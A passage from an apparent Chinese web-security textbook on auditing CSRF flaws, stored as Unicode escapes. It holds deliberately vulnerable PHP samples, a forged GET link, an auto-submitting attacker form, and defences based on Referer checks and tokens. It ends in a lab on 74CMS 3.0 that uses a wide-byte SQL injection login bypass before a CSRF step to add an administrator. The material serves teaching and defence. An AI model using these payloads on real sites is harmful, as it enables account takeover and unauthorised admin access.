l Token\u9A8C\u8BC1\u4E0EReferer\u9A8C\u8BC1\u7B97\u6CD5\u662F\u5426\u5B58\u5728\u6F0F\u6D1E\u7B49\u3002\r
\r
## 5.2 CSRF\u6F0F\u6D1E\u5206\u7C7B\r
\r
\u6839\u636EHTTP\u8BF7\u6C42\u7684\u65B9\u5F0F\u4E0D\u540C\uFF0C\u4E00\u822C\u5C06CSRF\u6F0F\u6D1E\u5206\u4E3A\u4E24\u79CD\uFF0C\u5206\u522B\u662F\uFF1AGET\u578BCSRF\u3001POST\u578BCSRF\u3002\u7531\u4E8EGET\u578BCSRF\u6F0F\u6D1E\u4F7F\u7528\u7684\u662F\u660E\u6587\u4F20\u8F93\uFF0C\u56E0\u6B64\u8BE5\u7C7B\u578B\u5E76\u4E0D\u591A\u89C1\u3002\u5728\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u5C06\u5927\u90E8\u5206\u4EE5POST\u578BCSRF\u6F0F\u6D1E\u4E3A\u4E3B\u3002\u672C\u5C0F\u8282\u5C06\u5BF9\u4E24\u79CDCSRF\u6F0F\u6D1E\u7684\u4EE3\u7801\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
### 5.2.1 GET\u578BCSRF\u6F0F\u6D1E\r
\r
\uFF081\uFF09GET\u578BCSRF\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u4EE3\u7801\u6848\u4F8B\u5982\u4E0B\uFF1A\r
\r
\r
\r
**if(!check_csrf_login($link)){**           //\u68C0\u67E5\u7528\u6237\u662F\u5426\u5904\u4E8E\u767B\u5F55\u72B6\u6001\r
\r
  **header("location:csrf_get_login.php");}**\r
\r
if(**isset($_GET['submit'])**){\r
\r
  if($_GET['sex']!=null && $_GET['phonenum']!=null && $_GET['add']!=null && $_GET['email']!=null){\r
\r
\u200B    $getdata=escape($link, $_GET);          //\u89E3\u6790\u6570\u636E\r
\r
\u200B    $query="update member set sex='{$getdata['sex']}',phonenum='{$getdata['phonenum']}',address='{$getdata['add']}',email='{$getdata['email']}' where username='{$_SESSION['csrf']['username']}'";      //\u66F4\u65B0\u7528\u6237\u4FE1\u606F\r
\r
\u200B    $result=execute($link, $query);         //\u6267\u884C\u66F4\u65B0\r
\r
\u200B    if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0){\r
\r
\u200B      header("location:csrf_get.php");\r
\r
\u200B    }else {$html1.='\u4FEE\u6539\u5931\u8D25\uFF0C\u8BF7\u91CD\u8BD5';}}}\r
\r
\r
\r
\uFF082\uFF09\u5206\u6790\u6F0F\u6D1E\uFF1A\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u4E3A\u67D0\u7528\u6237\u4FEE\u6539\u4E2A\u4EBA\u8BE6\u7EC6\u4FE1\u606F\u540E\u53F0\u4EE3\u7801\u3002\u5176\u4F7F\u7528HTTP\u7684GET\u65B9\u5F0F\u4F20\u9012\u53C2\u6570sex\u3001phonenum\u3001add\u7B49\u4FE1\u606F\u8FDB\u884C\u66F4\u65B0\u3002\u5728\u4F7F\u7528SQL\u8BED\u53E5\u67E5\u8BE2\u6570\u636E\u5E93\u4E4B\u524D\uFF0C\u5904\u7406\u8BF7\u6C42\u8FC7\u7A0B\u4E2D\u5E76\u6CA1\u6709\u5BF9\u7528\u6237\u7684token\u3001referer\u7B49\u53C2\u6570\u8FDB\u884C\u9A8C\u8BC1\u3002\u4ECE\u800C\u53EF\u4EE5\u5F62\u6210GET\u578BCSRF\u6F0F\u6D1E\u3002\r
\r
l \u7528\u6237lucy\u5904\u4E8E\u767B\u5F55\u72B6\u6001\uFF1A\u7528\u6237\u8F93\u5165\u6B63\u786E\u7528\u6237\u540D\u5BC6\u7801\u767B\u5F55\u5E73\u53F0\uFF1B\r
\r
l \u67E5\u770BHTTP\u8BF7\u6C42\u7684URL\uFF1Ahttp://192.168.0.11/ /csrf_get_edit.php?**sex**=girl&**phonenum**=12345678922&**add**=beijing&**email**=lucy%40test.com&**submit**=submit\r
\r
l \u4EE3\u7801\u5BA1\u8BA1\u65E0CSRF\u9632\u62A4\uFF0C\u5047\u8BBE\u653B\u51FB\u8005\u9884\u4FEE\u6539\u7528\u6237lucy\u7684\u90AE\u7BB1\u4E3A\u81EA\u5DF1\u7684\u90AE\u7BB1\u4E3A360@360.com\uFF1B\u5730\u5740\u4E3A360\u3002\u8BF1\u4F7F\u7528\u6237lucy\u5904\u4E8E\u767B\u5F55\u72B6\u6001\u4E14Session\u672A\u8FC7\u671F\u60C5\u51B5\u4E0B\uFF0C\u70B9\u51FB\u521B\u5EFAPayload\u4E3A\uFF1Ahttp://192.168.0.11 /csrf_get_edit.php?sex=girl&phonenum=12345678922&**add=360**&**email=360@360.com**&submit=submit\r
\r
l \u7528\u6237lucy\u4FEE\u6539\u4E86\u4E2A\u4EBA\u4FE1\u606F\uFF0C\u5982\u56FE5-1\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image294.jpg)\r
\r
\u56FE5-1 \u7528\u6237\u4FEE\u6539\u4FE1\u606F\u56FE\r
\r
### 5.2.2 POST\u578BCSRF\u6F0F\u6D1E\r
\r
\uFF081\uFF09  POST\u578BCSRF\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u4EE3\u7801\u6848\u4F8B\u5982\u4E0B\uFF1A\r
\r
\r
\r
if(!check_csrf_login($link)){  header("location:csrf_post_login.php");}\r
\r
if(isset(**$_POST['submit'])**){\r
\r
  if(**$_POST['sex']**!=null && **$_POST['phonenum']**!=null && **$_POST['add']**!=null && **$_POST['email']**!=null){\r
\r
\u200B    $getdata=escape($link, **$_POST**);\r
\r
\u200B    $query="update member set sex='{$getdata['sex']}',phonenum='{$getdata['phonenum']}',address='{$getdata['add']}',email='{$getdata['email']}' where username='{$_SESSION['csrf']['username']}'";\r
\r
\u200B    $result=execute($link, $query);\r
\r
\u200B    if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0){\r
\r
\u200B      header("location:csrf_post.php");}else {\r
\r
\u200B      $html1.='\u4FEE\u6539\u5931\u8D25\uFF0C\u8BF7\u91CD\u8BD5';}}} \r
\r
\r
\r
\uFF082\uFF09  \u5206\u6790\u6F0F\u6D1E\uFF1A\r
\r
\u987E\u540D\u601D\u4E49\uFF0CPOST\u578BCSRF\u6F0F\u6D1E\u4F7F\u7528HTTP\u7684POST\u65B9\u5F0F\u63D0\u4EA4\u6570\u636E\u3002\u4E0A\u8FF0\u4EE3\u7801\u5B58\u5728CSRF\u6F0F\u6D1E\u7684\u539F\u56E0\u4E0EGET\u578BCSRF\u6F0F\u6D1E\u7C7B\u4F3C\uFF0C\u4E3B\u8981\u539F\u56E0\u662F\u672A\u5BF9\u7528\u6237\u7684token\u3001referer\u7B49\u53C2\u6570\u8FDB\u884C\u9A8C\u8BC1\u3002\r
\r
POST\u578BCSRF\u6F0F\u6D1E\u5728\u5229\u7528\u65B9\u5F0F\u4E0A\u4E0EGET\u578BCSRF\u6F0F\u6D1E\u4E0D\u540C\u3002POST\u578BCSRF\u6F0F\u6D1E\u4E0D\u80FD\u901A\u8FC7\u4F2A\u9020URL\u7684\u65B9\u5F0F\u8FDB\u884C\u653B\u51FB\u3002\u5229\u7528POST\u578BCSRF\u6F0F\u6D1E\u7684\u65B9\u5F0F\u5927\u591A\u9700\u8981\u653B\u51FB\u8005\u5148\u642D\u5EFA\u4E00\u4E2A\u7AD9\u70B9\uFF0C\u5E76\u5728\u7AD9\u70B9\u4E0A\u505A\u4E00\u4E2A\u53D1\u9001\u6076\u610F\u6570\u636E\u7684\u8868\u5355\uFF0C\u8BF1\u4F7F\u7528\u6237\u70B9\u51FB\u89E6\u53D1\u8BE5\u8868\u5355\u63D0\u4EA4\u94FE\u63A5\u3002\u5F53\u7528\u6237\u70B9\u51FB\u65F6\uFF0C\u5C31\u4F1A\u81EA\u52A8\u5411\u5B58\u5728CSRF\u7684\u670D\u52A1\u5668\u63D0\u4EA4POST\u8BF7\u6C42\u4FEE\u6539\u6570\u636E\u3002\r
\r
\uFF083\uFF09  \u5229\u7528\u65B9\u6CD5\uFF1A\r
\r
  \u653B\u51FB\u8005\u5728\u653B\u51FB\u670D\u52A1\u5668\u4E0A\u7F51\u7AD9\u7684\u6839\u8DEF\u5F84\u7F16\u5199\u6587\u4EF6\u4E3Apost.html\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<html><head>\r
\r
<script>\r
\r
window.onload = function() {  //\u81EA\u52A8\u89E6\u53D1postsubmit\u63D0\u4EA4FORM\u8868\u5355\r
\r
 document.getElementById("postsubmit").click();}\r
\r
<\/script>\r
\r
</head><body>\r
\r
//\u63D0\u4EA4\u4FEE\u6539\u4FE1\u606F\u7684POST\u8BF7\u6C42\r
\r
<FORM method="post" action="http://192.168.0.11/csrf_post_edit.php">\r
\r
  <input id="sex" type="text" name="sex" value="girl" />\r
\r
  <input id="phonenum" type="text" name="phonenum" value="12345678922" />\r
\r
  <input id="add" type="text" name="add" value="hacker" />\r
\r
  <input id="email" type="text" name="email" value="360@360.com" />\r
\r
  <input id="postsubmit" type="submit" name="submit" value="submit" />\r
\r
</FORM></body></html>\r
\r
\r
\r
  \u8BF1\u4F7F\u7528\u6237\u70B9\u51FB\u8BE5\u6076\u610F\u7F51\u7AD9\u94FE\u63A5\uFF1Ahttp://\u653B\u51FB\u8005\u670D\u52A1\u5668IP/post.html\u3002\u5C06\u89E6\u53D1\u4E0A\u8FF0\u4EE3\u7801\u5E76\u4FEE\u6539\u4E2A\u4EBA\u4FE1\u606F\u3002\r
\r
## 5.3 CSRF\u6F0F\u6D1E\u9632\u5FA1\r
\r
CSRF\u6F0F\u6D1E\u9632\u5FA1\u7684\u4E3B\u8981\u95EE\u9898\u5728\u4E8E\u767B\u5F55\u7684\u7528\u6237\u662F\u5426\u5728\u53EF\u4FE1\u60C5\u51B5\u4E0B\u64CD\u4F5C\u3002\u7531\u4E8EHTTP\u662F\u65E0\u72B6\u6001\u7684\u534F\u8BAE\uFF0C\u5F88\u591ACMS\u4E3A\u4E86\u80FD\u786E\u5B9A\u767B\u5F55\u7528\u6237\u7684\u53EF\u4FE1\u72B6\u6001\u4ECE\u800C\u9632\u5FA1CSRF\u6F0F\u6D1E\uFF0C\u5C06\u4E3B\u8981\u8FDB\u884C\u4EE5\u4E0B\u4E09\u4E2D\u9632\u5FA1\u65B9\u6CD5\uFF1A\u9A8C\u8BC1HTTP Referer\u5B57\u6BB5\u4ECE\u800C\u786E\u5B9AHTTP\u8BF7\u6C42\u7684\u6765\u6E90\u3001\u9A8C\u8BC1Token\u4ECE\u800C\u786E\u5B9A\u7528\u6237\u7684\u8BF7\u6C42\u662F\u5426\u53EF\u4FE1\u3001\u9A8C\u8BC1\u7801\u9A8C\u8BC1\u52A0\u56FA\u9632\u5FA1\u3002\u672C\u8282\u5C06\u4ECB\u7ECD\u4E0A\u8FF0\u4E09\u79CD\u9632\u5FA1\u65B9\u6CD5\u3002\r
\r
### 5.3.1 \u9A8C\u8BC1HTTP Referer\u5B57\u6BB5\r
\r
HTTP Referer\u662FHTTP\u534F\u8BAE\u5934\u4E2D\u6709\u4E00\u4E2A\u5B57\u6BB5\uFF0C\u5B83\u8BB0\u5F55\u4E86\u6B64\u6B21HTTP\u8BF7\u6C42\u7684\u6765\u6E90\u5730\u5740\u3002Referer\u5B57\u6BB5\u7684\u4F5C\u7528\u662F\u4FDD\u8BC1\u7528\u6237\u8BBF\u95EE\u4E00\u4E2A\u5B89\u5168\u53D7\u9650\u9875\u9762\u7684\u8BF7\u6C42\u90FD\u6765\u81EA\u4E8E\u540C\u4E00\u4E2A\u7F51\u7AD9\u3002\r
\r
\u4F8B\u5982\uFF1A\u7528\u6237\u5C0F\u714A\u9700\u8981\u8FDB\u884C\u94F6\u884C\u8F6C\u8D26\u65F6\uFF0C\u8BBF\u95EE http://bank.example/withdraw?account=xuan&amount=100&for=Mallory\uFF0C\u7528\u6237\u9700\u767B\u5F55bank.example\uFF0C\u7136\u540E\u901A\u8FC7\u70B9\u51FB\u9875\u9762\u4E0A\u7684\u6309\u94AE\u6765\u89E6\u53D1\u8F6C\u8D26\u4E8B\u4EF6\u3002\u8BE5\u8F6C\u5E10\u8BF7\u6C42\u7684 Referer \u503C\u5C31\u4F1A\u662F\u8F6C\u8D26\u6309\u94AE\u6240\u5728\u7684\u9875\u9762URL\uFF08\u901A\u5E38\u4EE5bank.example\u57DF\u540D\u5F00\u5934\uFF09\u3002\u5982\u679C\u653B\u51FB\u8005\u8981\u5BF9\u94F6\u884C\u7F51\u7AD9\u5B9E\u65BDCSRF\u653B\u51FB\uFF0C\u7528\u6237\u901A\u8FC7\u9ED1\u5BA2\u7684\u7F51\u7AD9\u53D1\u9001\u8BF7\u6C42\u5230\u94F6\u884C\u65F6\uFF0C\u8BE5\u8BF7\u6C42\u7684 Referer \u662F\u6307\u5411\u653B\u51FB\u8005\u7684\u7F51\u7AD9\uFF0C\u56FE5-2\u4E3AHTTP\u5934\u4E2Dreferer\u5B57\u6BB5\u5185\u5BB9\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image296.jpg)\r
\r
\u56FE5-2 HTTP\u8BF7\u6C42Referer\u5934\r
\r
\u56E0\u6B64\uFF0C\u94F6\u884C\u7F51\u7AD9\u53EA\u9700\u8981\u5BF9\u4E8E\u6BCF\u4E00\u4E2A\u8F6C\u8D26\u8BF7\u6C42\u9A8C\u8BC1\u5176Referer\u503C\uFF0C\u5982\u679C\u662F\u4EE5 bank.example\u5F00\u5934\u7684\u57DF\u540D\uFF0C\u5219\u8BF4\u660E\u8BE5\u8BF7\u6C42\u662F\u6765\u81EA\u94F6\u884C\u7F51\u7AD9\u81EA\u5DF1\u7684\u8BF7\u6C42\uFF0C\u662F\u5408\u6CD5\u7684\u3002\u5982\u679C Referer \u662F\u5176\u4ED6\u7F51\u7AD9\u7684\u8BDD\uFF0C\u5219\u6709\u53EF\u80FD\u662F\u9ED1\u5BA2\u7684 CSRF \u653B\u51FB\uFF0C\u62D2\u7EDD\u8BE5\u8BF7\u6C42\u3002\u6D41\u7A0B\u56FE\u5982\u56FE5-3\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image298.jpg)\r
\r
\u56FE5-3 CSRF\u6D41\u7A0B\u56FE\r
\r
Referer\u9632\u5FA1CSRF\u6F0F\u6D1E\u7684\u4F18\u70B9\u662F\u7B80\u5355\u6613\u884C\uFF0C\u7F51\u7AD9\u7684\u666E\u901A\u5F00\u53D1\u4EBA\u5458\u65E0\u9700\u5173\u5FC3CSRF\u6F0F\u6D1E\uFF0C\u53EA\u9700\u8981\u5728\u6700\u540E\u4E3A\u6240\u6709\u5B89\u5168\u654F\u611F\u7684\u8BF7\u6C42\u7EDF\u4E00\u589E\u52A0\u62E6\u622A\u5668\u68C0\u67E5Referer\u5373\u53EF\u3002\u7279\u522B\u662F\u5BF9\u4E8E\u5F53\u524D\u73B0\u6709\u7684\u7CFB\u7EDF\uFF0C\u4E0D\u9700\u8981\u6539\u53D8\u5F53\u524D\u7CFB\u7EDF\u7684\u4EFB\u4F55\u5DF2\u6709\u4EE3\u7801\u548C\u903B\u8F91\u3002 \r
\r
\u7ED9\u51FA\u67D0\u9776\u573A\u4EE3\u7801\u5982\u4E0B\uFF0C\u670D\u52A1\u5668\u5224\u65AD\u7528\u6237\u7684\u8BF7\u6C42\u5934\u7684Referer\u5B57\u6BB5\u5FC5\u987B\u5305\u542B\u670D\u52A1\u5668\u540D\u79F0\uFF0C\u5982\u679C\u5305\u542B\u5219\u5141\u8BB8\u901A\u8FC7\uFF0C\u5426\u5219\u62D2\u7EDD\u3002\r
\r
\r
\r
 if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )\r
\r
\r
\r
  \u503C\u5F97\u6CE8\u610F\u7684\u662F\uFF0C\u8BE5\u65B9\u6CD5\u5E76\u4E0D\u662F\u4E07\u65E0\u4E00\u5931\u3002Referer\u503C\u662F\u7531\u6D4F\u89C8\u5668\u63D0\u4F9B\u7684\uFF0C\u867D\u7136HTTP\u534F\u8BAE\u4E0A\u6709\u660E\u786E\u7684\u8981\u6C42\uFF0C\u4F46\u662F\u6BCF\u4E2A\u6D4F\u89C8\u5668\u5BF9\u4E8EReferer\u7684\u5177\u4F53\u5B9E\u73B0\u53EF\u80FD\u6709\u5DEE\u522B\uFF0C\u5E76\u4E0D\u80FD\u4FDD\u8BC1\u6D4F\u89C8\u5668\u81EA\u8EAB\u6CA1\u6709\u5B89\u5168\u6F0F\u6D1E\u3002\u4F7F\u7528\u9A8C\u8BC1 Referer \u503C\u7684\u65B9\u6CD5\uFF0C\u5C31\u662F\u628A\u5B89\u5168\u6027\u90FD\u4F9D\u8D56\u4E8E\u7B2C\u4E09\u65B9\uFF08\u5373\u6D4F\u89C8\u5668\uFF09\u6765\u4FDD\u969C\uFF0C\u4ECE\u7406\u8BBA\u4E0A\u6765\u8BB2\uFF0C\u8FD9\u6837\u5E76\u4E0D\u5B89\u5168\u3002\r
\r
### 5.3.2 \u9A8C\u8BC1Token\r
\r
CSRF\u653B\u51FB\u4E4B\u6240\u4EE5\u80FD\u591F\u6210\u529F\uFF0C\u662F\u56E0\u4E3A\u653B\u51FB\u8005\u53EF\u4EE5\u5B8C\u5168\u4F2A\u9020\u7528\u6237\u7684\u8BF7\u6C42\uFF0C\u8BE5\u8BF7\u6C42\u4E2D\u6240\u6709\u7684\u7528\u6237\u9A8C\u8BC1\u4FE1\u606F\u90FD\u5B58\u5728\u4E8Ecookie\u4E2D\uFF0C\u56E0\u6B64\u653B\u51FB\u8005\u53EF\u4EE5\u5728\u4E0D\u77E5\u9053\u8FD9\u4E9B\u9A8C\u8BC1\u4FE1\u606F\u7684\u60C5\u51B5\u4E0B\u76F4\u63A5\u5229\u7528\u7528\u6237\u81EA\u5DF1\u7684cookie\u6765\u901A\u8FC7\u5B89\u5168\u9A8C\u8BC1\u3002\r
\r
\u8981\u62B5\u5FA1CSRF\u5173\u952E\u5728\u4E8E\u8BF7\u6C42\u4E2D\u653E\u5165\u653B\u51FB\u8005\u6240\u4E0D\u80FD\u4F2A\u9020\u7684\u4FE1\u606F\uFF0C\u5E76\u4E14\u8BE5\u4FE1\u606F\u4E0D\u5B58\u5728\u4E8Ecookie\u4E2D\u3002\u53EF\u4EE5\u5728HTTP\u8BF7\u6C42\u4E2D\u4EE5\u53C2\u6570\u7684\u5F62\u5F0F\u52A0\u5165\u4E00\u4E2A\u968F\u673A\u4EA7\u751F\u7684token\uFF0C\u5E76\u5728\u670D\u52A1\u5668\u7AEF\u5EFA\u7ACB\u4E00\u4E2A\u62E6\u622A\u5668\u6765\u9A8C\u8BC1\u8FD9\u4E2Atoken\uFF0C\u5982\u679C\u8BF7\u6C42\u4E2D\u6CA1\u6709token\u6216token\u5185\u5BB9\u4E0D\u6B63\u786E\uFF0C\u5219\u8BA4\u4E3A\u53EF\u80FD\u662FCSRF\u653B\u51FB\u800C\u62D2\u7EDD\u8BE5\u8BF7\u6C42\u3002\r
\r
l \u67D0\u7F51\u7AD9\u751F\u6210token\u4EE3\u7801\uFF1A\r
\r
\r
\r
//\u751F\u6210\u4E00\u4E2Atoken,\u4EE5\u5F53\u524D\u5FAE\u5999\u65F6\u95F4+\u4E00\u4E2A5\u4F4D\u7684\u524D\u7F00\r
\r
function set_token(){\r
\r
  if(**isset($_SESSION['token'])**){\r
\r
\u200B    unset($_SESSION['token']);}\r
\r
   **$_SESSION['token']=str_replace('.','',uniqid(mt_rand(10000,99999),true));}**\r
\r
\r
\r
l \u524D\u53F0\u9875\u9762\u63D0\u4EA4token\u4EE3\u7801;\r
\r
\r
\r
<div id="per_info">\r
\r
  <FORM method="get">\r
\r
  <h1 class="per_title">hello,{$name},\u6B22\u8FCE\u6765\u5230\u4E2A\u4EBA\u4F1A\u5458\u4E2D\u5FC3</h1>\r
\r
   <p class="per_name">\u59D3\u540D:{$name}</p>\r
\r
  \u7701\u7565......\r
\r
  **<input type="hidden" name="token" value="{$_SESSION['token']}" />**\r
\r
  <input class="sub" type="submit" name="submit" value="submit"/>\r
\r
  </FORM>\r
\r
</div>\r
\r
\r
\r
l \u9A8C\u8BC1token\u4EE3\u7801\uFF1A\r
\r
\r
\r
if(isset($_GET['submit'])){\r
\r
  if($_GET['sex']!=null && $_GET['phonenum']!=null && $_GET['add']!=null\r
\r
\u200B    && $_GET['email']!=null && **$_GET['token']==$_SESSION['token']**){\r
\r
\u200B    \u7701\u7565\u2026\u2026\r
\r
\u200B    if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0){\r
\r
\u200B      header("location:token_get.php");\r
\r
}else {$html1.="<p>\u4FEE\u6539\u5931\u8D25,\u8BF7\u91CD\u65B0\u767B\u5F55</p>"; }}}\r
\r
**set_token();  //****\u751F\u6210token**\r
\r
\r
\r
### 5.3.3 \u9A8C\u8BC1\u7801\u9A8C\u8BC1\r
\r
  \u67D0\u4E9B\u7F51\u7AD9\u4F1A\u5728\u654F\u611F\u7684\u64CD\u4F5C\u9875\u9762\u8FDB\u884C\u9A8C\u8BC1\u7801\u9A8C\u8BC1\u529F\u80FD\uFF0C\u4ECE\u800C\u9632\u6B62CSRF\u6F0F\u6D1E\u7684\u53D1\u751F\uFF0C\u4F8B\u5982\uFF1A\u7528\u6237\u7684\u767B\u9646\u9875\u9762\u3001\u6CE8\u518C\u9875\u9762\u3001\u652F\u4ED8\u9875\u9762\u7B49\u3002\u4F46\u662F\u8003\u8651\u5230\u8F93\u5165\u9A8C\u8BC1\u7801\u4F1A\u5F71\u54CD\u7528\u6237\u4F53\u9A8C\uFF0C\u8BE5\u529F\u80FD\u6CA1\u6709Token\u9A8C\u8BC1\u5B9E\u7528\u3002\r
\r
## 5.4 CSRF\u5BA1\u8BA1CMS\u5B9E\u8DF5\r
\r
### 5.4.1  \u5B9E\u9A8C\uFF1A74CMS3.0 CSRF\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF974CMS\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u6DFB\u52A0\u7BA1\u7406\u5458\u6A21\u5757\u662F\u5426\u5B58\u5728CSRF\u6F0F\u6D1E\u3002\u9996\u5148\u4F7F\u7528\u5BBD\u5B57\u8282\u6CE8\u5165SQL\u767B\u5F55\u7BA1\u7406\u5458\uFF0C\u7136\u540E\u5229\u7528CSRF\u6F0F\u6D1E\u6DFB\u52A0\u65B0\u7BA1\u7406\u5458test_123\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80035.2.2\u8282\uFF1APOST\u578BCSRF\u6F0F\u6D1E\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1CSRF\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1B74CMS3.0\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09\u5BA1\u8BA1\u9636\u6BB5\r
\r
\u70B9\u51FB\u5C55\u5F00admin\u76EE\u5F55\uFF0C\u5728\u5F39\u51FA\u7684\u4E0B\u62C9\u5217\u8868\u4E2D\u53CC\u51FBadmin_users.php\u9875\u9762\uFF0C\u53F3\u4FA7\u9875\u9762\u53EF\u4EE5\u770B\u5230\u76F8\u5173\u4EE3\u7801\u3002\u5176\u4E2D\u5F53\u83B7\u53D6\u7684act\u53C2\u6570\u4E3Aadd_users_save\u65F6\uFF0C\u6267\u884C\u6DFB\u52A0\u7BA1\u7406\u5458\u64CD\u4F5C\uFF0C\u4EE3\u7801\u5982\u56FE5-4\u6240\u793A\uFF0C\u7A0B\u5E8F\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u4EE3\u7801\u6BB5\u9996\u5148\u68C0\u67E5\u5F53\u524D\u7528\u6237\u662F\u5426\u6743\u9650\u6DFB\u52A0\uFF0C\u5982\u679C\u6CA1\u6709\u6743\u9650\u5219\u76F4\u63A5\u7EC8\u6B62\u6389\u3002\r
\r
l \u5BF9\u7528\u6237\u4FE1\u606F\u5B57\u6BB5\u8FDB\u884C\u68C0\u67E5\uFF0C\u5305\u62EC\uFF1Aadmin_name\u3001email\u3001password\u3001rank\u7B49\u3002\r
\r
l \u8FDB\u5165\u6DFB\u52A0\u7BA1\u7406\u5458\u64CD\u4F5C\uFF0C\u5C06setsqlarr\u6570\u7EC4\u6267\u884Cinserttable\u64CD\u4F5C\uFF0C\u5C06\u7BA1\u7406\u5458\u63D2\u5165\u6570\u636E\u5E93\u3002\r
\r
\u5728\u6DFB\u52A0\u7BA1\u7406\u5458\u8FC7\u7A0B\u4E2D\uFF0C\u7531\u4E8E\u672A\u5BF9\u8BF7\u6C42\u7684Referer\u6216token\u5B57\u6BB5\u8FDB\u884C\u6821\u9A8C\uFF0C\u4ECE\u800C\u5BFC\u81F4\u8BE5\u529F\u80FD\u5C06\u5B58\u5728POST\u578B\u7684CSRF\u6F0F\u6D1E\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image300.jpg)\r
\r
\u56FE5-4 admin_users.php\u90E8\u5206\u4EE3\u7801\r
\r
\uFF082\uFF09\u6D4B\u8BD5\u5229\u7528\u9636\u6BB5\r
\r
CSRF\u6F0F\u6D1E\u7684\u5FC5\u5907\u6761\u4EF6\u662F\u7528\u6237\u5904\u4E8E\u767B\u5F55\u72B6\u6001\uFF0C\u56E0\u6B64\u9996\u5148\u4F7F\u7528\u5BBD\u5B57\u8282SQL\u6CE8\u5165\u767B\u5F55\u8BE5CMS\u3002\u8BBF\u95EEhttp://ip/admin/admin_login.php\u9875\u9762\u6765\u5230\u7F51\u7AD9\u540E\u53F0\u767B\u5F55\u8BA4\u8BC1\u9875\u9762\u3002\u4F7F\u7528BurpSuit\u62E6\u622A\u6570\u636E\u5305\u540E\uFF0C\u5C06\u7528\u6237\u540Dadmin\u4FEE\u6539\u4E3A\u201C%df%27 or 1=1%23\u201D\uFF0C\u5BBD\u5B57\u8282\u6CE8\u5165SQL\u8BED\u53E5\u4F7F\u5176\u767B\u5F55\u6210\u529F\uFF0C\u5982\u56FE5-5\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image302.jpg)\r
\r
\u56FE5-5 \u5BBD\u5B57\u8282XSS\u6570\u636E\u5305\r
\r
\u5173\u95EDBurpSuite\u7684\u4EE3\u7406\u6293\u5305\u529F\u80FD\uFF08\u5373intercept is off\uFF09\uFF0C\u91CD\u65B0\u5237\u65B0\u4E00\u904D\u6D4F\u89C8\u5668\u53D1\u73B0\u9875\u9762\u5DF2\u7ECF\u8FDB\u5165\u540E\u53F0\u3002\u767B\u5F55\u6210\u529F\u540E\uFF0C\u5982\u56FE5-6\u6240\u793A\u3002\u81F3\u6B64\u5DF2\u7ECF\u6EE1\u8DB3CSRF\u6F0F\u6D1E\u7684\u9996\u8981\u6761\u4EF6\uFF0C\u5373\u7528\u6237\u5904\u4E8E\u767B\u5F55\u72B6\u6001\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image304.jpg)\r
\r
\u56FE5-6 \u767B\u5F55\u6210\u529F\u6570\u636E\u5305\r
\r
\u7136\u540E\u8FDB\u5165\u7BA1\u7406\u5458\u540E\u53F0\uFF0C\u70B9\u51FB\u201C\u7BA1\u7406\u5458\u201D\u6807\u7B7E\u9875\uFF0C\u67E5\u770B\u7F51\u7AD9\u540E\u53F0\u7BA1\u7406\u5458\u72B6\u6001\uFF0C\u6B64\u65F6\u7CFB\u7EDF\u53EA\u6709\u4E00\u4E2A\u7BA1\u7406\u5458\u4E3Aadmin\u3002\u70B9\u51FB\u201C\u6DFB\u52A0\u7BA1\u7406\u5458\u201D\uFF0C\u8FDB\u5165\u6DFB\u52A0\u7BA1\u7406\u5458FORM\u8868\u5355\uFF0C\u5982\u56FE5-7\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image306.jpg)\r
\r
\u56FE5-7 \u6DFB\u52A0\u7BA1\u7406\u5458\u529F\u80FD\u9875\u9762\r
\r
\u5236\u4F5C\u7528\u6237\u70B9\u51FB\u7684\u6076\u610F\u7F51\u7AD9\u9875\u9762\uFF0C\u8BE5\u7F51\u9875\u7528\u4E8E\u63D0\u4EA4\u589E\u52A0\u7BA1\u7406\u5458\u529F\u80FD\uFF0C\u8BBE\u8BA1\u7684HTML\u9875\u9762\u4E3A\u589E\u52A0\u7BA1\u7406\u5458\u7684FORM\u8868\u5355\uFF0C\u63D0\u4EA4HTTP\u7684POST\u8BF7\u6C42\uFF0C\u4E14\u8BF7\u6C42\u8DEF\u5F84\u4E3A\uFF1Ahttp://127.0.0.1/admin/admin_users.php?act=add_users_save\r
\r
